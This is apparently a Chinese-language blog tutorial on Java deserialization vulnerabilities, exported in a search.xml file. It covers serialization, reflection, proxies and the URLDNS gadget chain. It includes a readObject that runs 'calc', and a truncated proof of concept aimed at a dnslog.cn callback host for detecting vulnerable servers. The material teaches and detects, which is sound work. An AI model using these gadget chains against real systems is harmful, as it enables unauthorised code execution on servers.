<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>java反序列化</title>
    <url>/2024/03/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>java 基础</p>
<span id="more"></span>

<p>java 命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serialization</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h2><p>JDK类库中序列化API</p>
<p>问什么会产生安全问题</p>
<p><strong>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击这在服务器上运行代码的能力。</strong></p>
<p>可能的形式</p>
<ol>
<li>入口类的readObject直接调用危险方法</li>
<li>入口类参数中包含可控类，该类有危险方法，readObject时调用。</li>
<li>入口类参数中包含可控类，该类又调用其他，有危险方法的类，readObject时调用</li>
</ol>
<p>比如类型定义为Object 调用equals&#x2F;hashcode&#x2F;toString</p>
<p>重点 相同类型 ，同名函数</p>
<p>4.构造函数&#x2F;静态代码块等类加载时隐式执行.</p>
<p>共同条件，继承Serializable</p>
<p>入口类source （重写readObject 调用常见的函数，参数类型宽泛，最好jdk自带）</p>
<p>调用链 gadget chain</p>
<p>执行类 sink (rce ssrf写文件等等)</p>
<p><strong>java.io.ObjectOutputStream：表示对象输出流</strong></p>
<p>它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>
<p><strong>java.io.ObjectInputStream：表示对象输入流</strong></p>
<p>它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回</p>
<p> 5.transient 标识的对象成员变量不参与序列化</p>
<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>  <span class="comment">//implements Serializable 序列化的接口</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span> <span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name =name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span>+name+<span class="string">&#x27;\&#x27;&#x27;</span>+</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span>+age+</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois )</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Serialize.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">serializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span>  <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Unserialize.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span>  IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span>(Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过序列化和反序列化实现弹窗</p>
<p><a href="https://github.com/frohoff/ysoserial/">frohoff&#x2F;ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. (github.com)</a></p>
<h2 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h2><p>正射</p>
<p>我们在编写代码时，当需要到某一个类的时候，都会先了解这个类是做什么的，然后再实例化这个类，接着实例化好的对象进行操作，这就是正射，</p>
<p>反射</p>
<p>反射就是，一开始并不知道我们要初始化的类的对象是什么，自然也无法使用new 关键字来创建对象了。</p>
<p>反射的作用：让java具有动态性</p>
<p><img src="https://s3.bmp.ovh/imgs/2024/02/19/7f083dc556181c68.png"></p>
<p><strong>1.第一阶段：代码阶段&#x2F;编译阶段</strong></p>
<p>最开始学习java时，我们都会创建一个.java后缀的文件，然后在里面写上我们的代码。运行前通过javac对其进行编译，得到一个.class后缀的字节码文件</p>
<p><strong>2.第二阶段：类加载阶段（Class类阶段）</strong></p>
<p>当执行new一个对象时，会先通过类加载器ClassLoader将我们所需要的类进行加载（此处就体现了反射），这里的类加载是以.class后缀文件为基础的。加载完后，在堆中会产生一个Class类型的对象（一个类只有一个Class对象），这个对象包含了类的完整结构信息（成员变量、构造器、成员方法等），通过这个对象得到类的结构。（Class对象就像是一面镜子，透过这个镜子看到类的结构，故形象的称之为反射）</p>
<p><strong>3.第三阶段：Runtime运行阶段</strong></p>
<p>在运行阶段，我们通过new的方式创建的对象是在堆中，该对象知道它是属于哪个Class对象。若我们得到Class对象，也同样可以通过它来创建对象，调用对象方法，操作属性等。</p>
<p>java中与反射相关的类主要有四个：</p>
<ol>
<li><p><strong>java.lang.Class</strong></p>
<p>代表一个类，Class对象表示某个类加载后在堆中的对象</p>
</li>
<li><p><strong>java.lang.reflect.Method</strong></p>
<p>代表类的方法，Method对象表示某个类的方法</p>
</li>
<li><p><strong>java.lang.reflect.Field</strong></p>
<p>代表类的成员变量，Field对象表示某个类的成员变量</p>
</li>
<li><p><strong>java.lang.reflect.Constructor</strong></p>
<p>代表类的构造方法，Constructor对象表示构造器</p>
</li>
</ol>
<p><strong>修改已有对象的属性， 动态生成对象，动态调用方法，操作内部类和私有方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line">        Field[] personfields= c.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:personfields)</span><br><span class="line">        &#123;</span><br><span class="line">         System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.Class类对象不是new出来的，而是系统创建的</strong></p>
<p>在类加载时，通过类加载器ClassLoader的loadClass方法得到该类的Class对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.bmp.ovh/imgs/2023/10/05/80e1c006911a108c.png"></p>
<p>无法修改，由于age是私有属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefkectionTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">// c.newInstance();</span></span><br><span class="line">        Constructor personconstructor=c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span>(Person) personconstructor.newInstance(<span class="string">&quot;abdc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line"><span class="comment">/*        Field[] personfields= c.getFields();</span></span><br><span class="line"><span class="comment">        for(Field f:personfields)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功修改</p>
<p>为上面person 类添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span>&#123;</span><br><span class="line">    System.out.println(act);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method actionmethod=c.getMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">      actionmethod.invoke(p,<span class="string">&quot;asdasjkjbmnmbmndf&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>修改为私有后，然后调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>   <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span>&#123;</span><br><span class="line">    System.out.println(act);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method actionmethod=c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">      actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      actionmethod.invoke(p,<span class="string">&quot;asdasjkjbmnmbmndf&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="jdk静态代理"><a href="#jdk静态代理" class="headerlink" title="jdk静态代理"></a>jdk静态代理</h2><p>代理模式（Proxy）：为其他对象提供一个代理以控制对这个对象的访问。<br>主要解决：在直接访问对象时带来的问题，比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。</p>
<p>代理模式的元素是：共同接口、代理对象、目标对象。</p>
<p>代理模式的行为：由代理对象执行目标对象的方法、由代理对象扩展目标对象的方法。</p>
<p>代理模式的宏观特性：对客户端只暴露出接口，不暴露它以下的架构。</p>
<p>好处多多：中间隔离了一层，更加符合开闭原则</p>
<p>在类的声明中，通过关键字extends来创建一个类的子类。一个类通过关键字implements声明自己使用一个或者多个接口。<br>extends 是继承某个类, 继承之后可以使用父类的方法, 也可以重写父类的方法; implements 是实现多个接口, 接口的方法一般为空的, 必须重写才能使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口 IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原来功能 Userlmp.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserProxy.java  与Userlmp 共同使用IUser 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//进行代理</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    user.show();</span><br><span class="line">    <span class="comment">//实现对目标功能的扩展</span></span><br><span class="line">    System.out.println(<span class="string">&quot;调用了show&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ProxyTest.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">   <span class="comment">//    实现静态代理访问</span></span><br><span class="line">        IUser userProxy=<span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        userProxy.show();</span><br><span class="line">        &#125;&#125;      </span><br></pre></td></tr></table></figure>

<p>有时必须从几个类中派生出一个子类，继承它们所有的属性和方法。但是，Java不支持多重继承。有了接口，就可以得到多重继承的效果。</p>
<p>接口(interface)是抽象方法和常量值的定义的集合。</p>
<p>从本质上讲，接口是一种特殊的抽象类，这种抽象类中只包含常量和方法的定义，而没有变量和方法的实现。</p>
<p><strong>静态代理模式在不改变目标对象的前提下，实现了对目标对象的功能扩展。</strong><br><strong>不足：静态代理实现了目标对象的所有方法，一旦目标接口增加方法，代理对象和目标对象都要进行相应的修改，增加维护成本。</strong></p>
<h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><p>如果接口方法多，那代理必须跟着重写很多重复的代码，通过动态代理可以解决<strong>不用写代理类，直接创建代理实例，调用代理方法</strong></p>
<p>主要涉及两个类：<code>java.lang.reflect.Proxy</code> 和 <code>java.lang.reflect.InvocationHandler</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口 IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原来功能 Userlmp.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserInvocationHandler.java  动态代理</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//invoke 回调函数，确定调用那个方法</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy,Method method,Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了&quot;</span>+method.getName());</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ProxyTest.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        <span class="comment">//动态代理</span></span><br><span class="line">        <span class="comment">//要代理的接口,要做的事情</span></span><br><span class="line">        InvocationHandler userinvocationhandler=<span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        IUser userProxy=(IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),</span><br><span class="line">        userinvocationhandler);</span><br><span class="line">        userProxy.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态代理一种设计模式，不修改原有类，增加功能，</p>
<p>动态代理的意义，少修改代码，适配强，在反序列化漏洞中的作用</p>
<p>readObject&gt;反序列化自动执行，invoke&gt;有函数调用，</p>
<p>拼接两条链，任意变固定</p>
<p><a href="https://www.jianshu.com/p/8ccdbe00ff06">Java代理（Proxy）模式 - 简书 (jianshu.com)</a></p>
<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p> URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果不是命令执⾏，⽽是⼀次DNS请求。它使⽤Java内置的类构造，对第三⽅库没有依赖，对JDK版本没有要求，且其结果是发起一次DNS请求，不管目标有无回显，都⾮常适合用来检测是否存在反序列化漏洞</p>
<p>对链子进行分析</p>
<p>代码中最重要的三个类是HashMap,URL,URLStreamHandler。其中HashMap重写了readObject方法，URL类是里面有个hashCode()方法被HashMap的readObject()调用了，URLStreamHandler类是里面的getHostAddress被URL类里面的hashCode()方法调用</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a1fc5b9d2a31b541.png"></p>
<p>在HashMap 中存在反序列化接口在该类的readObject方法的最后一行</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/64590666b0bd646a.png"></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/61f192fe68fcb22f.png"></p>
<p>发现传入了一个Object类型的key，如果key为空，返回0，</p>
<p>返回 调用传入类key的hashCode 方法，而且URL类中也有URL类中含有hashCode()方法，所以是可以控制的</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/e8d2f8603bd54694.png"></p>
<p>这里说hashCode !&#x3D; -1，则直接返回hashCode，而该URL类的hashCode值被默认定义成了-1。如果等于-1，则继续往下走，我们继续跟进hashCode(this)方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a7497b49e97087f1.png"></p>
<p>再跟进getHostAddress方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3694b1100a74f071.png">接着跟进</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3d267520d169e20b.png"></p>
<p>判断是否为空，最后执行InetAddress.getByName(host)获取目标ip地址，其实在网络中就是一次DNS请求</p>
<p>最后理一遍思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.java</span><br><span class="line">hashMap-&gt;readObject(),最后一行中调用hash(key)</span><br><span class="line">hashMap-&gt;hash(),key不为空，调用key.hashCode(),</span><br><span class="line">URL.java</span><br><span class="line">URL-&gt;hashCode(),hashCode的初始值为-1，若不为-1，返回 handler.hashCode(this);</span><br><span class="line">==&gt;URLStreamHandler.hashCode,进入getHostAddress(u),</span><br><span class="line">进入URLStreamHandler.getHostAddress，返还u.getHostAddress();即URL-&gt;getHostAddress()</span><br><span class="line">hostAddress = InetAddress.getByName(host);</span><br><span class="line">发起dns 请求</span><br></pre></td></tr></table></figure>

<p>构链思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashmap=new Hashmap</span><br><span class="line">url=new URL</span><br><span class="line">反射修改url1的URL的hashCode的为1</span><br><span class="line">hashMap.put(url,&quot;test&quot;)</span><br><span class="line">修改URL的hashCode为回-1</span><br></pre></td></tr></table></figure>

<p>poc 链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(<span class="string">&quot;http://md8zyk.dnslog.cn&quot;</span>);</span><br><span class="line">        runReadobject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        